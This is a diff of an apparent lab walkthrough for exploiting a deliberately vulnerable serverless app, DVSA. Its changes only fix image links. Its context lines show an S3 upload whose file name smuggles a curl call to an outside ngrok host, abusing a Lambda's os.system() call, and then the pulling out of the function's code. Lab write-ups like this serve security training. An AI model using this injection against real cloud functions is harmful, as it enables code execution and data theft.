@@ -13,7 +13,7 @@ Let's see how to exploit it:
 
 1. If you completed at least one order, you will receive an email with a link to download the receipt. It should look something like that:
 
-![alt receript-sample]()
+![alt receript-sample](https://i.imgur.com/XwcHgF3.png)
 
 
 You can notice that the path to the file in the bucket is the date. e.g. 2018/12/24/{receipt-uuid}.txt.
@@ -25,7 +25,7 @@ aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null;curl 0c971764.ngrok
 ```
 (The *echo x.raw* at the end of the file name is used to trigger the function, which is only triggered when a .raw file is created).
 
-![alt ls](blob:https://imgur.com/891559ef-09a2-47a8-8200-67631727eeb9)
+![alt ls](https://i.imgur.com/h9mw2qV.png)
 
 
 3. We know the file's name, let's extract its code:
@@ -34,11 +34,11 @@ aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null;curl 0c971764.ngrok
 ```
 
 We now have the code in Base64 (I cut out most of it for a better screenshot).
-![alt b64-code](https://i.imgur.com/undefined.png)
+![alt b64-code](https://i.imgur.com/KcklwO0.png)
 
 
 Let's decode: ```echo <BASE64_STRING> | base64 --decode > /tmp/lambda.py```
-![alt code](https://i.imgur.com/undefined.png)
+![alt code](https://i.imgur.com/GD3YwJg.png)
 
 We can now see the vulnerable code - os.system() - which uses the name of the uploaded file as part of the command. 
 
